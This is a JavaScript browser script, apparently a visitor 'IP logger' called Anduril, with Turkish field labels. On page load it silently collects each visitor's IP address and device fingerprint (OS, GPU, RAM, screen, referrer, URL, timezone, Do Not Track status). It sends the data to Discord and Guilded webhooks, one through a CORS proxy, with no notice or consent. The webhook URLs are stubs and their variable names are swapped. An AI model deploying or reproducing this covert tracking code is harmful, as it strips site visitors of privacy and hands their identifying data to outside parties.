var ip = "0.0.0.0"

let ipify;
let ipapi;
let rednexie;
let json;
let webhook;
let webhook2;
fetch("./api.json")
    .then(response => response.json())
    .then(data => {
        ipify = data.ipify;
        ipapi = data.ipapi;
        rednexie = data.rednexie;

        fetch(rednexie)
            .then(response => response.text())
            .then(data => ip = data)
            .catch(error => console.log(error))
        
        // Open Source IP API with Node.js
        // https://github.com/Rednexie/ip
    })
    .catch(error => console.error(error));






function guilded(url, content, browser, ip, os, arch, mode, cpu, orientation, ram, res, cookie, supportsCookie, html5, gpu, version, dnt){

    let corsproxyUrl = "https://corsproxy.io/?";

    const body = {
        "content": `${content}`,
        "tts": false,
        "embeds": [
          {
            "type": "rich",
            "title": `Log`,
            "description": `Yeni bir kullanıcı ziyaret etti.`,
            "color": 0x545ccc,
            "fields": [
              {
                "name": `IP Adresi`,
                "value": `${ip}`
              },
              {
                "name": `Kullandığı Tarayıcı`,
                "value": `${browser}`
              },
              {
                "name": `İşletim Sistemi`,
                "value": `${os}`
              },
              {
                "name": `Cihaz Mimarisi`,
                "value": `${arch}`
              },
              {
                "name": `Karanlık Mod`,
                "value": `${mode}`
              },
              {
                "name": `Yönlendirme`,
                "value": `${document.referrer || "yok"}`
              },
              {
                "name": `İşlemci Çekirdeği Sayısı`,
                "value": `${cpu}`
              },
              {
                "name": `Oryantasyon`,
                "value": `${orientation}`
              },
              {
                "name": `RAM`,
                "value": `${ram}`
              },
              {
                "name": `Ekran Çözünürlüğü`,
                "value": `${res}`
              },
              {
                "name": `Çerezler`,
                "value": `${cookie} - ${supportsCookie}`
              },
              {
                "name": `HTML5`,
                "value": `${html5}`
              },
              {
                "name": `Ziyaret Edilen URL`,
                "value": `${window.location.href}`
              },
              {
                "name": `Ekran Kartı`,
                "value": `${gpu}`
              },
              {
                "name": `Ziyaret Ediilen Zaman`,
                "value": new Date().toLocaleString("tr-TR").replaceAll(":"," : ").replaceAll(".", " . ")
              },{
                "name": `Tarayıcı Sürümü`,
                "value": `${version}`
              },
              {
                "name": `Dili`,
                "value": `${navigator.language}`
              }, 
              {
                "name": `Zaman Dilimi`,
                "value": `${Intl.DateTimeFormat().resolvedOptions().timeZone}`
              },
              {
                "name": `Do Not Track`,
                "value": `${dnt}`
              }
            ],
            "author": {
              "name": `Anduril v1.0.3.8`,
              "icon_url": `https://cdn.discordapp.com/attachments/1068642023789301884/1090565045097873468/kali-removebg-preview.jpg`
            },
            "url": `https://github.com/Rednexie`
          }
        ]
    };


fetch(corsproxyUrl + url, {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify(body)
})
  .then((response) => response.json())
  .then((data) => console.log(data))
  .catch((error) => console.error(error));

}


function discord(url, content, browser, ip, os, arch, mode, cpu, orientation, ram, res, cookie, supportsCookie, html5, gpu, version, dnt){

    let webhookUrl = url;

    const body = {
        "content": `${content}`,
        "tts": false,
        "embeds": [
          {
            "type": "rich",
            "title": `Log`,
            "description": `Yeni bir kullanıcı ziyaret etti.`,
            "color": 0x545ccc,
            "fields": [
              {
                "name": `IP Adresi`,
                "value": `${ip}`
              },
              {
                "name": `Kullandığı Tarayıcı`,
                "value": `${browser}`
              },
              {
                "name": `İşletim Sistemi`,
                "value": `${os}`
              },
              {
                "name": `Cihaz Mimarisi`,
                "value": `${arch}`
              },
              {
                "name": `Karanlık Mod`,
                "value": `${mode}`
              },
              {
                "name": `Yönlendirme`,
                "value": `${document.referrer || "yok"}`
              },
              {
                "name": `İşlemci Çekirdeği Sayısı`,
                "value": `${cpu}`
              },
              {
                "name": `Oryantasyon`,
                "value": `${orientation}`
              },
              {
                "name": `RAM`,
                "value": `${ram}`
              },
              {
                "name": `Ekran Çözünürlüğü`,
                "value": `${res}`
              },
              {
                "name": `Çerezler`,
                "value": `${cookie} - ${supportsCookie}`
              },
              {
                "name": `HTML5`,
                "value": `${html5}`
              },
              {
                "name": `Ziyaret Edilen URL`,
                "value": `${window.location.href}`
              },
              {
                "name": `Ekran Kartı`,
                "value": `${gpu}`
              },
              {
                "name": `Ziyaret Ediilen Zaman`,
                "value": new Date().toLocaleString("tr-TR")
              },{
                "name": `Tarayıcı Sürümü`,
                "value": `${version}`
              },
              {
                "name": `Dili`,
                "value": `${navigator.language}`
              }, 
              {
                "name": `Zaman Dilimi`,
                "value": `${Intl.DateTimeFormat().resolvedOptions().timeZone}`
              },
              {
                "name": `Do Not Track`,
                "value": `${dnt}`
              }
            ],
            "author": {
              "name": `Anduril v1.0.3.8`,
              "icon_url": `https://cdn.discordapp.com/attachments/1068642023789301884/1090565045097873468/kali-removebg-preview.jpg`
            },
            "url": `https://github.com/Rednexie`
          }
        ]
    };


fetch(webhookUrl, {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify(body)
})
  .then((response) => response.text())
  .then((data) => console.log(data == "" ? "Discord Webhook Success" : "Discord Webhook Error"))
  .catch((error) => console.error(error));

}

document.addEventListener("DOMContentLoaded", (ev) => {
    console.log("DOMContentLoaded")
    const info = {
    darkmode: uniqueness.darkmode ? "Koyu Mod Açık" : "Koyu Mod Kapalı",
    browser: uniqueness.browser,
    ip: ip,
    os: uniqueness.os(),
    arch: uniqueness.arch(),
    cpu: uniqueness.cpuCores,
    orientation: uniqueness.orientation,
    res: uniqueness.screen().resolution,
    ram: uniqueness.ram(),
    supportsCookie: uniqueness.supports.cookie() ? "Destekliyor" : "Desteklemiyor",
    cookie: uniqueness.cookies ? "Açık" : "Kapalı",
    html5: uniqueness.supports.html5(),
    gpu: uniqueness.gpu().renderer,
    version: uniqueness.version,
    timezone: uniqueness.timezone,
    color: uniqueness.color,
    dnt: uniqueness.dnt == null ? "Kapalı" : "Açık",
    }

    const discordUrl = "https://media.guilded.gg/webhooks/";
    const guildedUrl = "https://discord.com/api/webhooks"

    setTimeout(() => {guilded(guildedUrl, "Log", info.version, ip, info.os, info.arch, info.darkmode, info.cpu, info.orientation, info.ram, info.res, info.cookie, info.supportsCookie, info.html5, info.gpu, info.version, info.dnt)},250)
    setTimeout(() => {discord(discordUrl, "Log", info.version, ip, info.os, info.arch, info.darkmode, info.cpu, info.orientation, info.ram, info.res, info.cookie, info.supportsCookie, info.html5, info.gpu, info.version, info.dnt)},250)

})

/*
uniqueness.getIP().then(ip => {
  console.log(ip);
});
*/
